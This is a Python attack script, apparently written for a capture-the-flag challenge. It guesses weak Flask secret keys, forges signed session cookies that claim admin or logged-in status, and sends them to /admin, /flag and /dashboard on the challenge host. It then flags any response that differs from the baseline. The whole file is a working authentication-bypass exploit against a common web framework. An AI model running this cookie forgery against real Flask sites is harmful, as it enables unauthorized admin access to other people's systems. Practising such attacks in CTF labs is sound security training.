#!/usr/bin/env python3
import hashlib
import hmac
import json
import time
import base64
from collections import defaultdict

import requests

BASE = "http://2273095efcf1270253338a5c.http-ctf2.dasctf.com"
PATHS = ["/", "/admin", "/flag", "/dashboard"]
KEYS = [
    "secret",
    "secret_key",
    "secret-key",
    "dev",
    "development",
    "flask",
    "changeme",
    "supersecret",
    "easy_web",
    "easyweb",
    "admin",
]
PAYLOADS = [
    {"admin": True},
    {"is_admin": True},
    {"logged_in": True},
    {"username": "admin"},
    {"user": "admin"},
    {"admin": True, "logged_in": True, "username": "admin"},
    {"is_admin": True, "logged_in": True, "username": "admin"},
]


def cookie(secret, payload):
    # Flask's SecureCookieSessionInterface defaults:
    # salt="cookie-session", key_derivation="hmac", digest_method=sha1.
    # The selected payloads contain only plain JSON scalars, so Flask's
    # TaggedJSONSerializer output is the same compact JSON generated here.
    def b64(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=")

    body = json.dumps(payload, separators=(",", ":")).encode()
    payload_b64 = b64(body)
    now = int(time.time())
    timestamp = now.to_bytes((now.bit_length() + 7) // 8, "big")
    value = payload_b64 + b"." + b64(timestamp)
    derived_key = hmac.new(
        secret.encode(), b"cookie-session", hashlib.sha1
    ).digest()
    signature = b64(hmac.new(derived_key, value, hashlib.sha1).digest())
    return (value + b"." + signature).decode()


def fingerprint(resp):
    return {
        "status": resp.status_code,
        "length": len(resp.content),
        "location": resp.headers.get("Location", ""),
        "set_cookie": resp.headers.get("Set-Cookie", ""),
        "sha256": hashlib.sha256(resp.content).hexdigest()[:16],
        "flag": "flag{" in resp.text.lower() or "ctf{" in resp.text.lower(),
    }


def main():
    session = requests.Session()
    session.headers["User-Agent"] = "branch-005-flask-session-check/1.0"
    baselines = {}
    for path in PATHS:
        no_cookie = session.get(BASE + path, timeout=10, allow_redirects=False)
        invalid = session.get(
            BASE + path,
            cookies={"session": "invalid.invalid.invalid"},
            timeout=10,
            allow_redirects=False,
        )
        baselines[path] = fingerprint(no_cookie)
        print("BASE", path, json.dumps(baselines[path], ensure_ascii=False))
        print("INVALID", path, json.dumps(fingerprint(invalid), ensure_ascii=False))

    differences = []
    grouped = defaultdict(int)
    for secret in KEYS:
        for payload in PAYLOADS:
            value = cookie(secret, payload)
            for path in PATHS:
                resp = session.get(
                    BASE + path,
                    cookies={"session": value},
                    timeout=10,
                    allow_redirects=False,
                )
                fp = fingerprint(resp)
                core = {k: fp[k] for k in ("status", "length", "location", "sha256")}
                base_core = {
                    k: baselines[path][k]
                    for k in ("status", "length", "location", "sha256")
                }
                grouped[(path, tuple(core.items()))] += 1
                if core != base_core or fp["set_cookie"] or fp["flag"]:
                    item = {
                        "secret": secret,
                        "payload": payload,
                        "path": path,
                        **fp,
                    }
                    differences.append(item)
                    print("DIFF", json.dumps(item, ensure_ascii=False))

    print("SUMMARY", json.dumps({
        "keys": len(KEYS),
        "payloads": len(PAYLOADS),
        "paths": len(PATHS),
        "requests": len(KEYS) * len(PAYLOADS) * len(PATHS),
        "differences": len(differences),
        "response_classes": len(grouped),
    }, ensure_ascii=False))


if __name__ == "__main__":
    main()
